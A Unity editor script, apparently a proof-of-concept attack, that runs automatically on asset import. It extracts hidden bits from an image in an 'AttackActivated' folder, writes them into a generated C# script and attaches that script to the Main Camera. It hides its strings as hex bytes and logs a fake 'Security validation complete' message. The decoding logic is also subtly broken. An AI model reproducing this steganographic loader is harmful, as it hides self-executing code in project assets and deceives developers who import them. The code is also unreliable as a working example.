#if UNITY_EDITOR
using UnityEditor;
using UnityEngine;
using System.IO;
using System;
using System.Linq;
using System.Text;

public class Launcher : AssetPostprocessor
{
    // Runs before a texture is imported
    void OnPreprocessTexture()
    {
        // "box_embedded.jpg" encoded (same as your original)
        string c = Convert.ToBase64String(new byte[]{0x62,0x6F,0x78,0x5F,0x65,0x6D,0x62,0x65,0x64,0x64,0x65,0x64,0x2E,0x6A,0x70,0x67});

        if (assetPath.EndsWith(Encoding.ASCII.GetString(Convert.FromBase64String(c)), StringComparison.OrdinalIgnoreCase))
        {
            var d = (TextureImporter)assetImporter;
            d.isReadable = true;
            d.textureCompression = TextureImporterCompression.Uncompressed;
            d.SaveAndReimport();
        }
    }

    // Runs after any assets are imported / moved / deleted
    static void OnPostprocessAllAssets(string[] D, string[] E, string[] F, string[] G)
    {
        string H = "Assets/HelloWorld.cs";     // must be under Assets/ for Unity to import
        string I = J();
        File.WriteAllText(H, K(I));
        AssetDatabase.Refresh();
        EditorApplication.delayCall += L;
    }

    static void L()
    {
        Type M = AppDomain.CurrentDomain.GetAssemblies()
            .SelectMany(a => a.GetTypes())
            .FirstOrDefault(t => t.Name == Encoding.ASCII.GetString(new byte[]{0x48,0x65,0x6C,0x6C,0x6F,0x57,0x6F,0x72,0x6C,0x64}));

        GameObject N = GameObject.Find(Encoding.ASCII.GetString(new byte[]{0x4D,0x61,0x69,0x6E,0x20,0x43,0x61,0x6D,0x65,0x72,0x61}));
        if (N != null && M != null) N.AddComponent(M);
    }

    static string J()
    {
        Texture2D O = AssetDatabase.LoadAssetAtPath<Texture2D>("Assets/Final/AttackActivated/box_embedded.jpg");
        if (O == null) return string.Empty;

        byte[] P = new byte[O.width * O.height * 3];
        for (int Q = 0; Q < O.height; Q++)
        {
            for (int R = 0; R < O.width; R++)
            {
                Color S = O.GetPixel(R, Q);
                P[Q * O.width + R] = (byte)(((int)(S.r * 255) & 1) * 255);
            }
        }
        // (kept your original behavior)
        return Encoding.ASCII.GetString(P.Where(b => b > 0).Select(b => (byte)1).ToArray());
    }

    static string K(string input)
    {
        StringBuilder T = new StringBuilder();
        T.Append("using UnityEngine;");
        T.Append("public class ");
        T.Append(Encoding.ASCII.GetString(new byte[]{0x48,0x65,0x6C,0x6C,0x6F,0x57,0x6F,0x72,0x6C,0x64}));
        T.Append(":MonoBehaviour{void Start(){Debug.Log(\"");
        T.Append(input.Aggregate("", (U,V) => U + (char)(V ^ 0x55)));
        T.Append("\");}}");
        return T.ToString();
    }

    // Editor-only static initializer
    [InitializeOnLoad]
    public class SecurityCheck {
        static SecurityCheck() {
            for (int i = 0; i < 10; i++) {
                if ((i ^ 0xF) != 0xA) continue;
                Debug.Log("Security validation complete");
            }
        }
    }
}
#endif
